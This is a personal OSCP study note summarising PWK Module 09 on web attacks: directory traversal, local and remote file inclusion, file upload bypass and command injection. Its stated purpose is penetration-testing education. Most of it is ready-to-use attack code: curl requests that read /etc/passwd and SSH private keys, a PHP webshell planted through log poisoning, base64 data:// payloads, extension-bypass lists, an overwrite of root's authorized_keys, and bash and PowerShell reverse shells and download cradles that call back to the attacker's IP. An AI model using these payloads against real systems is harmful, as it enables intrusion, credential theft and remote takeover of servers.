---
title: "PWK Module 09 - Common Web Application Attacks"
created: "2026-04-04"
source: "PEN-200 PWK Course (OffSec 2025) - Pages 245-279"
type: reference-note
status: active
tags:
  - oscp
  - web-attacks
  - pwk
  - reference
  - module-09
---

# Module 09 — Common Web Application Attacks

> **OSCP Exam Relevance:** These four attack classes appear constantly in the PWK labs and are highly likely on the exam. Directory Traversal → LFI → RCE via log poisoning is a key chain. File upload bypass and command injection are fast paths to shells. Master all four.

**Learning Units Covered:**
- 9.1 Directory Traversal
- 9.2 File Inclusion Vulnerabilities (LFI + PHP Wrappers + RFI)
- 9.3 File Upload Vulnerabilities (Executable + Non-Executable)
- 9.4 Command Injection

---

## 9.1 Directory Traversal

### What It Is
A vulnerability where unsanitized user input allows reading files **outside the web root** using relative path sequences (`../`). The web server processes the path and serves the file — you can read anything the web server user (`www-data`) has permission to read.

**Key distinction from LFI:** Directory Traversal only **reads** files. File Inclusion **executes** them.

---

### 9.1.1 Path Concepts

**Absolute path** — starts from `/` (root), works from anywhere:
```bash
cat /etc/passwd                     # always works regardless of current dir
```

**Relative path** — relative to current location, use `../` to go up:
```bash
cat ../../etc/passwd                # 2 dirs up → root → etc/passwd
cat ../../../../../../../etc/passwd  # extra ../ doesn't matter once at root
```

> 💡 **OSCP tip:** When you don't know how deep you are in the directory tree, just spam `../` (10-15 times). Linux stops at `/` — it can't go higher.

---

### 9.1.2 Identifying and Exploiting Directory Traversal

**How to spot it:**
- URL parameters that take a filename or path as a value (e.g., `?page=admin.php`, `?file=en.html`, `?lang=fr`)
- Hover all buttons/links and inspect parameters
- Look for filenames in GET parameters → try substituting paths

**Exploitation on Linux:**

```bash
# Step 1: Test for the vulnerability (read /etc/passwd)
http://target.com/index.php?page=../../../../../../../../../etc/passwd

# Step 2: Find users (from /etc/passwd output) and check for SSH keys
http://target.com/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

# Step 3: Use curl for clean output (not browser)
curl "http://target.com/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa"

# Step 4: Save key and SSH in
chmod 400 stolen_key
ssh -i stolen_key -p 22 offsec@target.com
```

**Exploitation on Windows:**

```bash
# Test file (readable by all users)
http://target.com/index.php?page=../../../../../../../../Windows/System32/drivers/etc/hosts

# IIS web server - check logs and config
http://target.com/index.php?page=../../../../../../../../inetpub/logs/LogFiles/W3SVC1/
http://target.com/index.php?page=../../../../../../../../inetpub/wwwroot/web.config

# Windows uses backslashes — try both:
?page=..\..\..\..\..\Windows\System32\drivers\etc\hosts
?page=../../../../../Windows/System32/drivers/etc/hosts
```

**High-value files to read on Linux:**

| File | What it reveals |
|------|----------------|
| `/etc/passwd` | All user accounts + home directories |
| `/home/<user>/.ssh/id_rsa` | SSH private key → direct SSH access |
| `/home/<user>/.ssh/authorized_keys` | What keys are trusted |
| `/var/log/apache2/access.log` | Apache logs (useful for LFI log poisoning) |
| `/var/log/nginx/access.log` | Nginx logs |
| `/etc/nginx/nginx.conf` | Nginx config (find other vhosts/paths) |
| `/proc/self/environ` | Environment variables (may have credentials) |
| `/var/www/html/<app>/config.php` | App config with DB credentials |

---

### 9.1.3 Encoding Special Characters (Bypass Filters)

Many WAFs and filters block `../` — use URL encoding to bypass:

| Character | URL Encoded |
|-----------|------------|
| `.` (dot) | `%2e` |
| `/` (slash) | `%2f` |
| `\` (backslash) | `%5c` |

**Examples:**
```bash
# Encode dots only (../ → %2e%2e/)
curl "http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Encode everything (../ → %2e%2e%2f)
curl "http://192.168.50.16/cgi-bin/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double encoding (sometimes bypasses two-pass filters)
# . → %252e  / → %252f
curl "http://target.com/page=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
```

> 💡 **Why encoding works:** Filters often check for literal `../` but miss `%2e%2e/`. After passing the filter, the server URL-decodes the request and processes the actual path traversal.

---

## 9.2 File Inclusion Vulnerabilities

### LFI vs Directory Traversal — Critical Distinction

| | Directory Traversal | File Inclusion (LFI/RFI) |
|---|---|---|
| **Effect** | Reads file contents | **Executes** file contents |
| **PHP file** | Shows PHP source code | **Runs** the PHP code |
| **Impact** | Information disclosure | **Remote Code Execution** |
| **OSCP value** | Read SSH keys, configs | Get a shell |

---

### 9.2.1 Local File Inclusion (LFI)

**Same vulnerable parameter as Directory Traversal — but instead of just reading, PHP executes included files.**

#### LFI → RCE via Log Poisoning

The most reliable LFI-to-RCE technique. Works by writing PHP code into a log file, then including that log via LFI to execute it.

**Step 1: Verify LFI and confirm log file access**
```bash
curl "http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log"
# You should see log entries including User-Agent field
```

**Step 2: Poison the log with a PHP webshell via User-Agent**

In Burp Repeater, modify User-Agent header to:
```
<?php echo system($_GET['cmd']); ?>
```
Then send the request → PHP code is written to `access.log`

**Step 3: Execute commands via the poisoned log**
```bash
# Include the log (triggers PHP execution) + pass a command
curl "http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=id"

# Use %20 for spaces in commands
curl "http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la"
```

**Step 4: Get a reverse shell**
```bash
# Set up Netcat listener first
nc -nvlp 4444

# Send reverse shell via log poisoning (URL-encode the whole thing)
curl "http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%22"
```

**Other log files to try for log poisoning:**

| Log File | Poisonable Field |
|----------|-----------------|
| `/var/log/apache2/access.log` | User-Agent, Referer |
| `/var/log/nginx/access.log` | User-Agent |
| `/var/log/vsftpd.log` | FTP username (send PHP as username) |
| `/var/log/ssh/auth.log` | SSH username |
| `/proc/self/environ` | User-Agent (environment variable) |

---

### 9.2.2 PHP Wrappers

PHP provides built-in wrappers that can extend LFI exploitation capabilities.

#### php://filter — Read PHP Source Code

**Without encoding** (PHP executes the file, source not visible):
```bash
curl "http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php"
```

**With Base64 encoding** (PHP can't execute Base64 → source is exposed):
```bash
curl "http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php"
# Returns base64 blob → decode it:
echo "PCFET0NUW..." | base64 -d
# Now you see the PHP source — including hardcoded credentials!
```

> 🎯 **OSCP use case:** `php://filter` + base64 → read PHP source → find hardcoded DB passwords → try credentials for SSH.

#### data:// — Execute Arbitrary PHP Code

Embeds PHP code directly in the URL and executes it via the LFI vulnerability.

```bash
# Plaintext PHP via data://
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

# Base64-encoded PHP (bypass WAF filters blocking "system" keyword)
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
# → PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

> ⚠️ **Requirement:** `data://` only works if `allow_url_include = On` in PHP config. Off by default — less common than LFI log poisoning.

---

### 9.2.3 Remote File Inclusion (RFI)

Instead of including a local file, you include a file from **your attacking machine**. The target fetches and executes your webshell.

**Requirements:** `allow_url_include = On` (off by default in modern PHP — RFI is rarer than LFI)

**Step 1: Set up a webshell on your Kali machine**
```bash
# Kali has built-in webshells
ls /usr/share/webshells/php/
cat /usr/share/webshells/php/simple-backdoor.php

# Serve it via Python HTTP server
cd /usr/share/webshells/php/
python3 -m http.server 80
```

**Step 2: Include your webshell remotely**
```bash
curl "http://mountaindesserts.com/meteor/index.php?page=http://YOUR_KALI_IP/simple-backdoor.php&cmd=ls"
```

**Kali webshell locations:**
```
/usr/share/webshells/php/     → PHP webshells
/usr/share/webshells/asp/     → ASP webshells
/usr/share/webshells/aspx/    → ASPX webshells
/usr/share/webshells/jsp/     → JSP webshells
```

---

## 9.3 File Upload Vulnerabilities

### Three Categories

| Category | Example | Technique |
|----------|---------|-----------|
| **Executable upload** | Upload PHP webshell | Bypass extension blacklist |
| **Non-executable + another vuln** | Combine with Dir Traversal | Overwrite `authorized_keys` |
| **User interaction** | Malicious Word macro | Social engineering (out of scope for labs) |

---

### 9.3.1 Executable File Uploads (PHP Webshell)

**Goal:** Upload a PHP webshell that gets executed when accessed via URL.

**Step 1: Test what's allowed**
```bash
# Start with an innocent file
echo "test" > test.txt
# Upload via form — observe response, note upload directory from output
```

**Step 2: Try uploading the webshell directly**
```bash
# If .php is blacklisted, try these alternatives:
.php2  .php3  .php4  .php5  .php6  .php7
.phtml  .phps  .phar
.pHP   .PHP   .PhP        ← case variation bypass
```

**Step 3: Upload and execute**
```bash
# Rename and upload
cp /usr/share/webshells/php/simple-backdoor.php simple-backdoor.pHP

# After upload, access and execute commands
curl "http://target.com/uploads/simple-backdoor.pHP?cmd=id"
```

**Step 4: Get a reverse shell (Windows target)**
```bash
# Start listener
nc -nvlp 4444

# Encode PowerShell reverse shell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP",4444);...'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText    # copy this output
exit

# Execute via webshell
curl "http://target.com/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<BASE64>"
```

**Step 4 (Linux target):**
```bash
nc -nvlp 4444
curl "http://target.com/uploads/simple-backdoor.pHP?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%22"
```

**Filter bypass techniques:**

| Bypass | Example |
|--------|---------|
| Alternative extensions | `.php7`, `.phtml`, `.phar` |
| Case variation | `.pHP`, `.PHP`, `.PhP` |
| Upload as `.txt`, rename | Upload innocent file, then use rename feature |
| Null byte (old PHP) | `shell.php%00.jpg` |
| Double extension | `shell.php.jpg` (if only last ext checked) |
| MIME type manipulation | Change `Content-Type` in Burp to `image/jpeg` |

---

### 9.3.2 Non-Executable Files + Directory Traversal

When you **can't execute** the uploaded file, combine with Directory Traversal to **overwrite sensitive files**.

**Goal:** Overwrite `/root/.ssh/authorized_keys` with your public key → SSH as root.

**Step 1: Generate SSH keypair**
```bash
ssh-keygen -f fileup        # creates fileup (private) and fileup.pub (public)
cat fileup.pub > authorized_keys
```

**Step 2: Upload with path traversal in filename**

In Burp — intercept upload request and modify `filename` parameter:
```
filename="../../../../../../../root/.ssh/authorized_keys"
```

**Step 3: SSH as root**
```bash
rm ~/.ssh/known_hosts       # clear old host keys to avoid conflict
ssh -p 22 -i fileup root@target.com
```

> ⚠️ **Real-world warning:** Overwriting files blindly on a production system can cause data loss and downtime. Always confirm it's a test environment.

> 💡 **Why this works:** Web servers often run as root in misconfigured dev/lab environments. If `www-data` can write to `/root/.ssh/`, you're in.

---

## 9.4 Command Injection

### What It Is
The web application passes user input directly to the OS shell without sanitization. You inject OS commands alongside the expected input using command delimiters.

**How to spot it:** Any feature that clearly triggers an OS command — "ping this host", "clone this repo", "convert this file", "run this check".

---

### 9.4.1 OS Command Injection

**Command delimiters to try (try all of them):**

| Delimiter | Works In | Example |
|-----------|---------|---------|
| `;` | Linux bash, PowerShell | `git;id` |
| `&&` | Linux, Windows CMD, PowerShell | `git&&id` |
| `\|\|` | Linux, Windows (runs if first fails) | `git\|\|id` |
| `\|` | Linux, Windows (pipe) | `git\|id` |
| `\n` (newline) | Some parsers | `git%0aid` |
| `&` | Windows CMD only | `git&id` |

**URL encoded versions:**
```
;   → %3B
&   → %26
|   → %7C
space → %20
```

**Step 1: Probe the filter**
```bash
# What's allowed?
curl -X POST --data 'Archive=git' http://target:8000/archive
# → shows git help = git command works

# Does injecting another command work?
curl -X POST --data 'Archive=git%3Bid' http://target:8000/archive
# → if id output appears = command injection confirmed
```

**Step 2: Detect the shell environment (CMD vs PowerShell)**
```bash
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://target:8000/archive
# Output = "CMD" or "PowerShell"
```

**Step 3: Get a reverse shell**

**Linux — Bash reverse shell:**
```bash
nc -nvlp 4444
curl -X POST --data 'Archive=git%3Bbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%22' http://target/archive
```

**Windows PowerShell — Powercat reverse shell:**
```bash
# Step 1: Copy powercat to current dir and serve via HTTP
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80

# Step 2: Start listener
nc -nvlp 4444

# Step 3: Inject PowerShell download cradle + powercat
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2FYOUR_IP%2Fpowercat.ps1%22)%3Bpowercat%20-c%20YOUR_IP%20-p%204444%20-e%20powershell' http://target:8000/archive
```

**Windows CMD — Simple shell:**
```bash
# Direct command injection
curl -X POST --data 'cmd=whoami%26dir' http://target/vulnerable
```

---

## 9.5 Attack Chain Summary

### Full LFI → Shell Chain

```
1. Find parameter that loads files (?page=, ?file=, ?lang=)
2. Test Directory Traversal → read /etc/passwd
3. Confirm LFI (not just DT) → include admin.php → does it execute?
4. Log Poisoning:
   a. Verify log access via LFI (access.log, auth.log)
   b. Inject PHP webshell into User-Agent header
   c. Include log + pass cmd parameter → RCE
5. Upgrade to reverse shell (bash one-liner)
```

### Full File Upload → Shell Chain

```
1. Find file upload form (avatar, resume, image contest, etc.)
2. Test with .txt → confirm uploads work
3. Try .php webshell → likely blocked
4. Bypass filter (try .pHP, .phtml, .php7)
5. Access uploaded file → cmd=id → confirm RCE
6. Get reverse shell (bash or PowerShell)
```

### Directory Traversal → Non-Exec Upload → SSH

```
1. Confirm file upload mechanism accepts path traversal in filename
2. Generate SSH keypair
3. Upload authorized_keys with ../../../root/.ssh/ prefix
4. SSH as root with private key
```

---

## Quick Reference Commands

```bash
# Directory Traversal
curl "http://<ip>/index.php?page=../../../../../../../../../etc/passwd"
curl "http://<ip>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# LFI log poisoning setup
curl "http://<ip>/index.php?page=../../../../../../../../../var/log/apache2/access.log"
# (inject webshell via User-Agent in Burp Repeater)
curl "http://<ip>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=id"

# PHP wrappers
curl "http://<ip>/index.php?page=php://filter/convert.base64-encode/resource=config.php"
curl "http://<ip>/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id"

# RFI
python3 -m http.server 80
curl "http://<ip>/index.php?page=http://YOUR_IP/simple-backdoor.php&cmd=id"

# File Upload - bypass extension blacklist
cp /usr/share/webshells/php/simple-backdoor.php shell.pHP
# Upload shell.pHP → curl "http://<ip>/uploads/shell.pHP?cmd=id"

# SSH via authorized_keys overwrite
ssh-keygen -f fileup && cat fileup.pub > authorized_keys
# (intercept upload in Burp → modify filename to ../../../root/.ssh/authorized_keys)
ssh -i fileup root@<ip>

# Command Injection
curl -X POST --data 'param=legit%3Bid' http://<ip>/endpoint          # Linux
curl -X POST --data 'param=legit%26whoami' http://<ip>/endpoint       # Windows

# Netcat listener (always)
nc -nvlp 4444

# Bash reverse shell (URL-encoded)
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%22
```

---

## Links

- [[PWK-Module-08-Web-App-Attacks]] — prerequisite module (Burp Suite, Gobuster, XSS)
- [[PWK-Module-10-SQL-Injection]] — next module
- [[LFI-to-RCE-Log-Poisoning-Pattern]] — permanent note
- [[File-Upload-Filter-Bypass-Techniques]] — permanent note
- [[Web-App-Enumeration-Checklist]] — use before attempting these attacks
- [[OSCP-Certification-Sprint]] — parent project

## External Resources

- [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [HackTricks - Directory Traversal](https://book.hacktricks.xyz/pentesting-web/path-traversal)
- [HackTricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [HackTricks - Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [RevShells.com](https://www.revshells.com/) — reverse shell generator (all languages, auto URL-encoded)
- [IppSec - File Inclusion videos](https://www.youtube.com/@ippsec) — search "LFI", "log poisoning"
